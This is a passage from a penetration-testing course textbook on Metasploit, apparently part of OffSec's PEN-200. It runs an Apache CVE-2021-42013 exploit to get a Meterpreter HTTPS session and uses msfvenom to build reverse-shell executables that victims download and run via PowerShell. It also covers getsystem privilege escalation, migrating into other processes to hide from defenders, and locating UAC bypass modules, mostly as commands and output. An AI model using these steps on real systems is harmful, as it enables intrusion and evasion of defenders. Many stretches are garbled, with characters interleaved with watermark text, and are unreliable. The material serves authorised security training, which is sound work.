+Compatible Payloads
+===================
+
+    # Name                                                                                                                          Disclosure Date  Rank
+                                                                                                                                                     ----
+Check Description
+
+    - ----                                                                                                                          ---------------                                                           ----
+
+- -----------
+
+    ...
+
+    <cr>10 payload/linux/x64/meterpreter_reverse_https                                                                                               normal
+
+No        Linux Meterpreter, Reverse HTTPS Inline</cr>
+
+    ...
+
+                     Listing 711 - Display Meterpreter HTTPS non-staged payload
+
+Listing 711 shows that index 10 is payload/linux/x64/meterpreter_reverse_https. Instead of a raw
+TCP connection, this payload uses HTTPS to establish the connection and communication
+between the infected target and our Kali machine. As the traffic itself is encrypted with SSL/TLS,
+defenders will only obtain information about HTTPS requests. Without further defensive
+techniques and technologies, they will be unlikely to decipher the Meterpreter communication.
+
+Let's select this payload and display its options.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>set payload 10</cu>
+payload => linux/x64/meterpreter_reverse_https
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>show options</cu>
+
+...
+
+Payload    op-Ct-ui-ro-rn-es-n-t(-l-Si-en-tu-tx-i/-nx-g64/Rm-ee-qt-ue-ir-rp-er-de-teDr-e_-sr-ec-vr-ie-rp-ts-ei-_o-Whn-hitttlposw):
+
+     Name
+     ----
+
+    LHOST 192.168.119.2 yes  TTThhhJeeeeflHlfoTorTccePaayllPllaiitshstteenneerr                                                     hostname
+                                                                                                                                    port
+    LPORT 4444       yes
+
+    LURI             no
+
+...                 sthinegreleLilsiisstaitnengn7Oae1Sdr2-do5-in7Dti7ioso5pnn2laa1eyl9pMo0operttetiorcpnarepfteoarrbHltTehTiosPfSphnaaoynnl-odstalaindggenddapimafyfeleordaednLtUrReIq. uTehsistsobpatsioend  can be
+                                                                                                                                                                                                              on the
+Listing 712 shows
+used to leverage a
+
+path in this option and provide a logical separation. If we leave this option blank, Metasploit just
+
+uses / as path.
+
+Now, let's launch the exploit module by entering run without setting a value to the LURI option.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>run</cu>
+
+[*] Started HTTPS reverse handler on https://192.168.119.4:4444
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is
+enabled).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
+[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_https command
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                      708
+                                                                          Penetration Testing with Kali Linux
+
+payload
+[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw)
+Redirecting stageless connection from
+/5VnUXDPXWg8tIisgT9LKKgwTqHpOmN8f7XNCTWkhcIUx8BfEHpEp4kLUgOa_JWrqyM8EB with UA
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69'
+...
+[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw)
+Attaching orphaned/stageless session...
+[*] Meterpreter session 5 opened (192.168.119.4:4444 -> 127.0.0.1) at 2022-08-08
+06:12:42 -0400
+[!] This exploit may require manual cleanup of '/tmp/IkXnnbYT' on the target
+
+meterpreter >
+
+               Listing 713 - Display output of Meterpreter HTTPS non-staged payload
+
+Listing 713 shows that the payload provided us with a Meterpreter session. The output displays
+the handling of various requests until the Meterpreter session is established. If a defender
+monitors the payload's communication, it seems like regular HTTPS traffic. Furthermore, if they
+would check the address of the communication endpoint (our Kali machine in this example),
+they'd only get a Not found page with HTTP code 404 in the browser.
+
+In a penetration test, we can use this payload to improve our chances of bypassing security
+technology and defenders. However, as Metasploit is one of the most well-known exploit
+frameworks, the detection rates of Meterpreter payloads are quite high by security technologies
+such as antivirus solutions. Therefore, we should always attempt to obtain an initial foothold with
+a raw TCP shell and then deploy a Meterpreter shell as soon as we have disabled or bypassed
+
+LMahppa2Menoao1roetdywat'td.eslwa2otnuishta.stlTepe3idduaC.liomlcfaPfiosntemneMdrasccaleiseunrftioprrczeEoittelrpumyxpordwrefoteetevcchhtscieheaudhmratertnpnasaawoanwnblteyeohyllTlgoseehgCia.earfPdPFseuvOi.aneSonapt-Hcanayc5ftlyoleliW7ooyolw7aov,nE5ataeweau2Bdrvdl1erei1e.et9sdyr8es0,x..titTpnJoWhelhioefesterhfxnefrikpisd,reionwsytrstdhteeWdepcofhiasatifHimctyoToullnoibTosl.iawfaPsudMerSsisdzecMeitawnedettrhiotoopaeurnvtrerpaMtsiresreeieroltovteuieeusrsrstppsMfwraiideleeyitetltehoatrytasbhpidpsaeelsaosasinicntcad'dsconodpdtshmiesifegocmnonurfmauasttnssuaheedrtiddsess
+
+such as Windows and Linux binaries, webshells, and more. Metasploit contains msfvenom as a
+standalone tool to generate these payloads. It provides standardized command line options and
+includes various techniques to customize payloads.
+
+To get familiar with msfvenom, we'll first create a malicious Windows binary starting a raw TCP
+reverse shell. Let's begin by listing all payloads with payloads as argument for -l. In addition, we
+use --platform to specify the platform for the payload and --arch for the architecture.
+
+kali@kali:~$ <cu>msfvenom -l payloads --platform windows --arch x64 </cu>
+
+...
+
+windows/x64/shell/reverse_tcp  Spawn a piped command shell (Windows x64)
+
+(staged). Connect back to the attacker (Windows x64)
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.              709
+                                                                                                                 Penetration Testing with Kali Linux
+
+...
+
+windows/x64/shell_reverse_tcp           Connect back to attacker and spawn a
+
+command shell (Windows x64)
+
+...
+
+                    Listing 714 - Creating a Windows executable with a reverse shell payload
+
+Listing 714 shows that we can choose between a staged and non-staged payload. For this
+example, we'll use the non-staged payload first.
+
+Now, let's use the -p flag to set the payload, set LHOST and LPORT to assign the host and port for
+the reverse connection, -f to set the output format (exe in this case), and -o to specify the output
+file name:
+
+kali@kali:~$ <cu>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2
+LPORT=443 -f exe -o nonstaged.exe</cu>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: nonstaged.exe
+
+                     Listing 715 - Creating a Windows executable with a non-staged TCP reverse shell payload
+
+Now that we have created the malicious binary file, let's use it. For this, we start a Netcat listener
+on port 443, Python3 web server on port 80, and connect to BRUTE2 via RDP with the user justin
+and password SuperS3cure1337#. Once we've connected over RDP, we can start PowerShell to
+transfer the file and execute it.
+
+PS C:\Users\justin>      <<ccuu>>.iw\rno-nusrtiaghetdt.pe:x/e/<1/9c2u.>168W.hi1t1l9o.w2/nonstaged.exe                                                                                                         -Outfile
+nonstaged.exe</cu>
+                                        wDoew'lnl lroeacdeniovJnee-sfatfanrgeinydcpoamyloiandgbrineavrey rasned
+PS C:\Users\justin>
+
+Once  we  executed  the  Listing 716 -                                                                           execute it                                                                                   our  Netcat  listener.
+
+                         binary file,                                                                            shell on
+
+kc(Mliicaolnc)snitreMo@ecskniactoinrflgttioso:o~Wo$ifn[tn19<d[2acCoonuw.1yr>sp6n]o8c[Vr.4-4ea1nt13rv9isl.io.pn.2on..]441AfO30lrS<ol.-/0m5cr.77u(i25>U0g2N3h1tK49sN80O.W1r6Nes)9]e[rv19ed2..168.50.202] 50822
+
+C:\Users\justin>
+                                  Listing 717 - Incoming reverse shell from non-staged Windows binary
+
+Now, let's use a staged payload to do the same. For this, we'll again use msfvenom to create a
+Windows binary with a staged TCP reverse shell payload.
+
+kali@kali:~$ <cu>msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2
+LPORT=443 -f exe -o staged.exe</cu>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                              710
+                                                                                                                                    Penetration Testing with Kali Linux
+
+Final size of exe file: 7168 bytes
+Saved as: staged.exe
+
+                        Listing 718 - Creating a Windows executable with a staged TCP reverse shell payload
+
+We'll repeat the steps from Listing 716 to download and execute staged.exe and we'll start the
+Netcat listener again.
+
+kali@kali:~$ <cu>nc -nvlp 443</cu>
+listening on [any] 443 ...
+connect to [192.168.119.2] from (UNKNOWN) [192.168.50.202] 50832
+<cu>whoami</cu>
+
+                                     Listing 719 - Incoming reverse shell from staged Windows binary
+
+While we received an incoming connection, we cannot execute any commands through it. This is
+because Netcat doesn't know how to handle a staged payload.
+
+To get a functional interactive command prompt, we can use Metasploit's multi/handler module,
+which works for many staged, non-staged, and more advanced payloads. Let's use this module to
+receive the incoming connection from staged.exe.
+
+In Metasploit, let's select the module with use. Then, we must specify the payload of the incoming
+connection. In our case, this is windows/x64/shell/reverse_tcp. In addition, we have to set the
+options for the payload. We enter the IP of our Kali machine as argument for LHOST and port 443
+as argument for LPORT. Finally, we can enter run to launch the module and set up the listener.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > <cu>use multi/handler</cu>
+[*] Using configured payload generic/shell_reverse_tcp
+
+.pPmmss.aa.yfyfl66looaaeexddxpplol=poo>itiwttioi((nmnmdusullotwt(iwis///ihxnhaad6no4n/ddwlslsh/eerxre)l6)l4>>//rs<<ehccveluuel>r>s/sseehrot_etvwcepJarpoespyftlef_oiraotedncysp<w)W:i/hinctdul>oowws/x64/shell/reverse_tcp</cu>
+
+sprpoeE-NLccX-HaieI-Omsf-TeSisFTe,UdN)nCone-Cp)-ur-or-cr-ee-sn-ts--S-e-t-t-i-n-gOS-Ryy-5eee-77sqs-5u-2i-1r-9e-0d-  Description
+                                                                                                                   -----------
+                                                                                                                   Exit technique (Accepted: '', seh, thread,
+
+                                                                                                                   The listen address (an interface may be
+
+LPORT  4444  yes                                                                                                   The listen port
+
+...
+
+msf6 exploit(multi/handler) > <cu>set LHOST 192.168.119.2</cu>
+LHOST => 192.168.119.2
+msf6 exploit(multi/handler) > <cu>set LPORT 443</cu>
+
+msf6 exploit(multi/handler) > <cu>run</cu>
+
+[*] Started reverse TCP handler on 192.168.119.2:443
+                                   Listing 720 - Set payload and options for multi/handler and launch it
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                         711
+                                                                                                                                                                                                                                                         Penetration Testing with Kali Linux
+
+Once our listener is running on port 443, we can start staged.exe again on BRUTE2. Our
+Metasploit multi/handler receives the incoming staged payload and provides us with an
+interactive reverse shell in the context of a session.
+
+[*] Started reverse TCP handler on 192.168.119.2:443
+[*] Sending stage (336 bytes) to 192.168.50.202
+[*] Command shell session 6 opened (192.168.119.2:443 -> 192.168.50.202:50838) at
+2022-08-01 10:18:13 -0400
+
+Shell Banner:
+Microsoft Windows [Version 10.0.20348.169]
+-----
+
+C:\Users\justin> <cu>whoami</cu>
+whoami
+brute2\justin
+
+                            Listing 721 - Incoming reverse shell from Windows binary with staged payload
+
+Nice! We received the staged reverse shell and Metasploit started a session for us to use. For
+staged and other advanced payload types (such as Meterpreter), we must use multi/handler
+instead of tools like Netcat for the payload to work.
+
+Using run without any arguments will block the command prompt until execution finishes or we
+
+background the session. As we've learned before, we can use run -j to start the listener in the
+
+background, allowing us to continue other work while we wait for the connection. We can use the
+
+jobs command to get a list of all currently active jobs, such as active listeners waiting for
+                                                            rWuhnit-lj.oTwhen,
+connections.    session  and  restart  the  listener  with                                                                                                                                                                                     we'll     list  the  currently  active  jobs
+Let's exit our
+
+ucCe<[m:cx*srse\]irfinaU6t>gts[1eee9*djrx]2o.sp.b\lE1sj6ox.upi8Ostl.t(o5ni0imcntu.e>2ltr0w<u2iec/n-uhne>aixCenneoxdgcmilumteata<rsen/)dcbOsua>Sts>ca-h<k5gegc7e7lrud5l>o.2eur1snux9eedn0sasj-Jgiojeob<afn/ifn1cr,6.ueM<>yc/elctoras>sepdl.oit  notifies  us that a new  session        was
+
+                                                                                                                                                                                                                                               Reason:   User exit
+
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.119.2:443
+
+msf6 exploit(multi/handler) > <cu>jobs</cu>
+
+Jobs
+====
+
+Id Name                                Payload                                                                                                                                                                                                           Payload opts
+
+-- ----                                -------                                                                                                                                                                                                           ------------
+
+1 Exploit: multi/handler windows/x64/shell/reverse_tcp tcp://192.168.119.2:443
+
+msf6 exploit(multi/handler) >
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                               712
+                                                                          Penetration Testing with Kali Linux
+
+[*] Sending stage (336 bytes) to 192.168.50.202
+[*] Command shell session 7 opened (192.168.119.2:443 -> 192.168.50.202:50839) at
+2022-08-01 10:26:02 -0400
+
+                            Listing 722 - Incoming reverse shell from Windows binary with staged payload
+
+As Metasploit created a new session for the incoming connection, we could now again interact
+with it with sessions -i and the session ID as argument.
+
+We can use the generated executable payloads from msfvenom in various situations during a
+penetration test. First, we can use them to create executable file types such as PowerShell
+scripts, Windows executables, or Linux executable files to transfer them to a target and start a
+reverse shell. Next, we can create malicious files such as web shells to exploit web application
+vulnerabilities. Finally, we can also use the generated files from msfvenom as part of a client-side
+attack.
+
+In this section, we explored executable payloads generated with msfvenom. We got familiar with
+how we can use msfvenom to generate executable files containing these payloads and how to
+set up multi/handler as listener for staged and non-staged payloads alike. Using msfvenom to
+generate executable files with various payloads and in numerous file types will assist us greatly in
+penetration tests.
+
+21.3 Performing Post-Exploitation with Metasploit
+
+This Learning Unit covers the following Learning Objectives:
+
+� Use core Meterpreter post-exploitation features
+
+� Use post-exploitation modules     Whitlow
+� Perform pivoting with Metasploit
+
+mTpeOwxrhneaipvecnligeolyeMaiwtgtaaeheesttesiaporg,senaaipcnnilMntfodsoiSatsrocmFoFfcramoetatnhsimoos.ednetup,wolrteooaascrkkteetaasrhsksgate.OeesStIpan-smns5ea7aatv7docce5dthr2miiaiv1tnile9aoe0iinn,nswtetJteaseoerifsnefcitsohroatneeiunnyragbmsaupocialovctn-eesintsao-srenMg,xuppteomiltvoetoeirhttpnaerttteiopoatoennosrdttfhce-peeoaerxmtrpumfolmroearimsatcanhttdpihinosoaen,stsstp,c-eheeavxalneepsrvlesaoailimtwtepahpotoeilsoiurftneyr-
+operations on them.
+
+In this Learning Unit, we'll explore these post-exploitation features and modules. We'll also
+perform pivoting with modules of the Metasploit Framework.
+
+21.3.1 Core Meterpreter Post-Exploitation Features
+
+In previous sections, we used the Meterpreter payload to navigate the file system, obtain
+information about the target system, and transfer files to and from the machine. Apart from the
+commands we already used, Meterpreter contains numerous post-exploitation features.
+
+Let's explore some of these features. We should note that the Linux Meterpreter payload contains
+fewer post-exploitation features than the Windows one. Therefore, we'll explore these features on
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.  713
+                                                                                                                                         Penetration Testing with Kali Linux
+
+the Windows target ITWK01. Let's assume we already gained an initial foothold on the target
+system and deployed a bind shell as way of accessing the system.
+
+To begin, we'll create an executable Windows binary with msfvenom containing a non-staged
+Meterpreter payload and name it met.exe.
+
+kali@kali:~$ <cu>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.119.4
+LPORT=443 -f exe -o met.exe</cu>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+
+                         Listing 723 - Create a Windows executable with a Meterpreter reverse shell payload
+
+After we set the payload and its options, we launch the multi/handler module in Metasploit.
+
+msf6 exploit(multi/handler) > <cu>set payload windows/x64/meterpreter/reverse_tcp</cu>
+payload => windows/x64/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > <cu>set LPORT 443</cu>
+LPORT => 443
+
+msf6 exploit(multi/handler) > <cu>run</cu>
+[*] Exploit running as background job 2.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.119.4:443
+
+Next,  we  start  a  Python3         Listing 724 -  sSeetrvoeptimonesta.endxWesht.iatTrtlhmoewunlt,i/whaendcloernnect                    to  the  bind  shell  on  port
+
+                              web server to
+
+4kWa4il4ni4d@okowanlsiIb:Ti~nW$aKr<y0c.1u.>nOcnc1e92c.o1n68n.e5c0te.d22, 3we44c4a4J<ne/fcdfuor>ewynload met.exe with PowerShell and start the
+
+(pMC:oci\cw)UersoMresisrcohsfre\oltdlsaoWvifetn>dCo<owcrsup>[oprVoaewtresiriosnohn.el1AOl0lS<l.-/05cr.77u2i5>2g20h10t9s00.r79es5e]rved.
+
+Windows PowerShell
+
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+PS C:\Users\dave> <cu>iwr -uri http://192.168.119.2/met.exe -Outfile met.exe</cu>
+iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
+
+PS C:\Users\dave> <cu>.\met.exe</cu>
+.\met.exe
+
+PS C:\Users\dave>
+                          Listing 725 - Connect to CLIENTWK220 and execute met.exe after downloading it
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                           714
+                                                                           Penetration Testing with Kali Linux
+
+Once the Windows binary is executed, Metasploit notifies us that it opened a new session.
+
+[*] Started reverse TCP handler on 192.168.119.2:443
+[*] Sending stage (203846 bytes) to 192.168.50.223
+[*] Meterpreter session 1 opened (192.168.45.191:443 -> 192.168.119.2:56655) at 2022-
+08-04 06:41:29 -0400
+
+meterpreter >
+
+                        Listing 726 - Incoming reverse shell from met.exe
+
+Now that we have an active Meterpreter session on a Windows target, we can start exploring
+post-exploitation commands and features.
+
+The first post-exploitation command we use is idletime. It displays the time for which a user has
+been idle. After obtaining basic information about the current user and operating system, this
+should be one of our first commands as it indicates if the target machine is currently in use or
+not.
+
+meterpreter > <cu>idletime</cu>
+User has been idle for: 9 mins 53 secs
+
+                                                Listing 727 - Display idle time from current user
+
+The output states that the user hasn't been interacting with the system for 9 minutes and 53
+seconds, suggesting the user may have stepped away from their computer. If the result of the
+idletime command indicates that the user is away, we can take this as an opportunity to execute
+programs or commands which may display a command-line window such as CMD or PowerShell
+for a moment.
+
+MFpeoerrtmassisepsvloieoirntaslcoptnootsatiN-nesTxptlAhoeUitaTctHiooOmnRmIfTeaYan\tSduYreSgseT,tEswMyse.teInmte,eudwsehWashicdihmtvlaioanrwtiitosetumrsatpivttseecthponriivqaiuuleetgosemsuasttioicnaglelyxneeaclmuetveeadtethpeoimpuer.
+                                          aJttehtfeefmredpyetifnagulttoseltetvinegrasg, egeStseyImstpeemrsounsaetseParilvl ileagvaeilaabnlde
+impersonation and  token duplication. In
+techniques (shown  in the help menu)
+SeDebugPrivilege.
+tmBheeotfsoeerreptrwweoeteperrxive>icleu<gtceeus>gsaehtssesyligsltn<e/emcdu,.>OleSt-'s57s7t5a2r1t9a0n interactive shell and confirm that our user has one of
+...
+
+C:\Users\luiza> <cu>whoami /priv</cu>
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name              Description                                    State
+
+============================= ========================================= ========
+
+...
+
+<cr>SeImpersonatePrivilege  Impersonate a client after authentication
+
+Enabled</cr>
+
+...
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.          715
+                                                                                                   Penetration Testing with Kali Linux
+
+C:\Users\luiza> <cu>exit</cu>
+exit
+
+                             Listing 728 - Display the assigned privileges to our user in an interactive shell
+
+Listing 728 shows that the user luiza has SeImpersonatePrivilege assigned. Now, let's use
+getsystem to attempt to elevate our privileges.
+
+meterpreter > <cu>getuid</cu>
+Server username: ITWK01\luiza
+
+meterpreter > <cu>getsystem</cu>
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+meterpreter > <cu>getuid</cu>
+Server username: NT AUTHORITY\SYSTEM
+
+                                              Listing 729 - Elevate our privileges with getsystem
+
+Listing 729 shows that getsystem successfully elevated our privileges to NT
+AUTHORITY\SYSTEM by using Named Pipe Impersonation (PrintSpooler variant) as we did
+manually in the Windows Privilege Escalation Module.
+
+Another important post-exploitation feature is migrate. When we compromise a host, our
+Meterpreter payload is executed inside the process of the application we attack or execute our
+payload. If the victim closes that process, our access to the machine is closed as well. In addition,
+depending on how the Windows binary file containing the Meterpreter payload is named, the
+process name may be suspicious if a defender is searching through the process list. We can use
+migrate to move the execution of our Meterpreter payload to a different process.
+
+Let's view all  running processes  by  entering  ps  in  theWhMietlteorwpreter  command            prompt.
+
+meterpreter     > <cu>ps</cu>
+
+Process List                                     Jeffrey
+============
+
+ PID   PPID Name        OS-57752190                  Arch Session User
+Path   ---- ----
+                                                     ---- ------- ----
+ ---    8500 met.exe
+----                                                 x64 0                      ITWK01\luiza
+
+ 2552
+
+C:\Users\luiza\met.exe
+
+...
+
+8052 4892 OneDrive.exe                               x64 1                      ITWK01\offsec
+
+C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+
+...
+
+                        Listing 730 - Display list of running processes
+
+Listing 730 shows that the process met.exe has the process ID 2552. The name and path will
+easily make the process stand out to a defender reviewing the process list. The output shows
+that offsec started a process related to OneDrive with process ID 8052. If our payload runs within
+this process, it is far less likely to be detected by reviewing the process list.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                        716
+                                                                          Penetration Testing with Kali Linux
+
+We should note that we are only able to migrate into processes that execute at the same (or
+lower) integrity and privilege level than that of our current process. In the context of this example,
+we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are plentiful.
+
+     If the migrate command returns the error Error while running command migrate:
+     undefined method `pid' for nil, make sure Metasploit is updated to the latest version.
+
+Let's migrate our current process to OneDrive.exe of the user offsec by entering migrate and the
+process ID we want to migrate to.
+
+meterpreter > <cu>migrate 8052</cu>
+[*] Migrating from 2552 to 8052...
+[*] Migration completed successfully.
+
+meterpreter > <cu>ps</cu>
+
+Process List
+============
+
+PID PPID Name          Arch Session User                                                               Path
+
+--- ---- ----          ---- ------- ----                                                               ----
+
+...
+
+2440 668 svchost.exe
+
+2472 668 svchost.exe
+
+2496 668 svchost.exe
+
+ 2568 668 svchost.exe                       Whitlow
+ 2624 668 spoolsv.exe  Listing 731J-eMfifgrraetye to explorer.exe
+ 2660 668 svchost.exe
+ 2784 668 svchost.exe
+ 2928 668 svchost.exe
+...
+
+rLratheeinsaveytirsmeienowfgonoirnr7efego.3, rFa1thusthserutihshspoeeriwsorrmscotehfotfsahrssetae,ctwlwi.sweet,e'lalwrsneeuo'OlcntlSicoc-feiwe5ns7dts7rhf5uauo2ntlu1lnyr9tih0nomegriipgginsirnaotatheul edtpprcuoootucnrcetosepnsxr,totacmoienfessttsh.leeetxsoesprtwiohniecftoehOrsmIsnDeawDt2iio5rtihn5ve2tth,hpeadrnooIDecbsee8sfn0soo.5rte2W.eaThxnehisndet
+
+meterpreter > <cu>getuid</cu>
+Server username: ITWK01\offsec
+
+                        Listing 732 - Command execution as user offsec instead of NT AUTHORITY\SYSTEM
+
+Instead of migrating to an existing process or a situation in which we won't find any suitable
+processes to migrate to, we can use the execute Meterpreter command. This command provides
+the ability to create a new process by specifying a command or program.
+
+To demonstrate this, let's start a hidden Notepad process and migrate to it as user offsec. For
+this, we use execute with -H to create the process hidden from view and _notepad as argument
+for -f__ to specify the command or program to run. Then, we migrate to the newly spawned
+process.
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                     717
+                                                                                                                                                                      Penetration Testing with Kali Linux
+
+meterpreter > <cu>execute -H -f notepad</cu>
+Process 2720 created.
+
+meterpreter > <cu>migrate 2720</cu>
+[*] Migrating from 8052 to 2720...
+[*] Migration completed successfully.
+
+meterpreter >
+
+               Listing 733 - Migrate to a newly spawned Notepad process
+
+Listing 733 shows how we can migrate to the newly spawned Notepad process. Since we used
+the option -H, the Notepad process was spawned without any visual representation. However, the
+process is still listed in the process list of applications such as the task manager.
+
+This concludes this section. We explored several post-exploitation features of Meterpreter. First,
+we used idletime to check if the user is actively working on the target system or not. Next, we
+elevated our privileges with the help of getsystem. Finally, we used migrate to move the execution
+of our Meterpreter payload to a different process.
+
+Meterpreter offers a variety of other interesting post-exploitation modules such as
+hashdump, which dumps the contents of the SAM database or screenshare, which
+displays the target machine's desktop in real-time.
+
+While these Meterpreter features are quite powerful, Metasploit contains numerous post-
+
+exploitation modules that extend the basic post-exploitation features we explored in this section.
+
+We'll review  and use some of them in  tMheondeuxtlesesctioWnh.itlow
+
+21.3.2          Post-Exploitation
+
+In addition to native commands     waendcaancdtieJopenflsofyrienaygtahiensctoarne                                                                                      functions of Meterpreter,  there  are
+several post-exploitation modules                                                                                                                                     active session.
+
+AwSadecilmcsl osliiikunoeninsltystCrpatohrtnooatrvtrsiodwlgee(rUuroeAsuCcpor,)ne.wlaytewedcitahtnharOoenSlu-eug5vn7hap7t5raei2vtt1oial9euc0grkesvdhesechltloetlrols.  such as the execution of a client-side attack
+                                                                                                                                                                      But if the target user is a member of the local
+                                                                                                                                                                      a high integrity level if we can bypass User
+
+In the previous section, we migrated our Meterpreter shell to a OneDrive.exe process that is
+running at (presumably) medium integrity. For this section, let's repeat the steps from the
+previous section and then bypass UAC with a Metasploit post-exploitation module to obtain a
+session in the context of a high integrity level process.
+
+As before, we connect to the bind shell on port 4444 on ITWK01, download and execute met.exe,
+and enter getsystem to elevate our privileges. Then, we use ps to identify the process ID of
+OneDrive.exe and migrate to it.
+
+meterpreter > <cu>getsystem</cu>
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+
+meterpreter > <cu>ps</cu>
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                 718
+                                                                                                                                                                                        Penetration Testing with Kali Linux
+
+Process List
+============
+
+PID PPID Name                                   Arch Session User
+
+Path
+
+--- ---- ----                                   ---- ------- ----
+
+----
+
+...
+
+<cr>8044</cr> 3912 OneDrive.exe                                                                                                                                                  x64 1       ITWK01\offsec
+
+C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+
+...
+
+meterpreter > <cu>migrate 8044</cu>
+[*] Migrating from 9020 to 8044...
+[*] Migration completed successfully.
+
+meterpreter > <cu>getuid</cu>
+Server username: ITWK01\offsec
+
+                                        Listing 734 - Migrate to OneDrive process of the user offsec
+
+Listing 734 shows that we are now running in the context of offsec again. While this is an
+administrative account, UAC prevents us from performing administrative operations as we
+learned in previous Modules. Before we attempt to bypass UAC, let's confirm that the current
+process has the integrity level Medium.
+
+To display the integrity level of a process, we can use tools such as Process Explorer or third-party
+
+PowerShell modules such as NtObjectManager. Let's assume the latter is already installed on the
+
+system.  import  the  module  with  Import-Module,  weWhciatnlouwse                                                                                                              Get-NtTokenIntegrityLevel     to  display
+Once we
+
+the integrity level of the current process  by  rJeetfriferveiyng         and  reviewing                                                                                                the  assigned  access  token.
+
+meterpreter > <cu>shell</cu>
+Process 6436 created.
+
+CM(Cpchoi:\wac)WenrionMrnseisdcohloefrwl1otsls\oWc-srifyentespadttCobeewomysrdp3p.a2o[s>rVsea<trcsiuoi>nopn.owA1Oe0lSr.l-s05h.r77e2i5lg22l0h10t90s-0.e7rp9e5sbe]yrpvaesds.</cu>
+
+Windows PowerShell
+
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements!
+https://aka.ms/PSWindows
+
+PS C:\Windows\system32> <cu>Import-Module NtObjectManager</cu>
+Import-Module NtObjectManager
+
+PS C:\Windows\system32> <cu>Get-NtTokenIntegrityLevel</cu>
+Get-NtTokenIntegrityLevel
+<cr>Medium</cr>
+
+                                    Listing 735 - Reviewing integrity level
+
+PEN-200 - Copyright � 2026 OffSec Services Limited. All rights reserved.                                                                                                                                               719
+                                                                                                                                                                                                                                              Penetration Testing with Kali Linux
+
+Listing 735 shows that we are currently performing operations in the context of integrity level
+Medium.
+
+Next, let's background the currently active channel and session to search for and leverage UAC
+post-exploitation modules.
+
+PS C:\Windows\system32> <cu>^Z</cu>
+Background channel 1? [y/N] <cu>y</cu>
+
+meterpreter > <cu>bg</cu>
+[*] Backgrounding session 9...
+
+                   Listing 736 - Background channel and session
+
+Now let's search for UAC bypass modules.
+
+msf6 exploit(multi/handler) > <cu>search UAC</cu>
+
+Matching Modules
+================
+
+    # Name                                                                                                                                                                                                                                    Disclosure Date Rank
+
+Check Description
+
+    - ----                                                                                                                                                                                                                                    --------------- ----
+
+----- -----------
+
+- ----                                                                    --------------- ----
+
+----- -----------
+
+    0 post/windows/manage/sticky_keys                                                                                                                                                                                                         normal
+
+No  Sticky Keys Persistance Module
+
+YeYexessc1.23e.l.leeeenWWxxxitipppnnlllddoooooYiiiewwtttsss///www11iii00nnndddUUUoooAAswwwCCesssr///PPlllrProoorooccctotaaafeelllcic///lttbbciieyvyooppenAn_aars2sbBB0ssyyi2utuppraaa2accss_ar_s_2sJyww6eii9VVf0iniJnfda4audro_noewwWcWsyisusit_innp_WseddsohirttoontpwwoolsrsCrroeroewSeS_f_rtfiatloietorlegrieeoesny((WsLWSSocRR2ee2a20l0s0s1ee21t99t2P..r---iee000xvx823eei---l))112e927gaendERleevgiammtsaatinnoruunyaall
+eexxcc1.1ee21.ll.lleeeennxxttppllooNYiieotts//wwiinnddWWooiiwwnnssdd//oollwwoossccaaEEllssOL//ccSisbbaa-tiyyll5nppaa7g7aatt75ssee32ss71uUUu-9aAAaS0CCcce__aPPssrcirdrholcofltetoenter tccUtctAiilCoeobnnaynpBuBaypyssppaamssossdu((leVVsiiaa  2017-03-17
+                                                                                                                                                                                                                                              Shell Open Registry  Key)
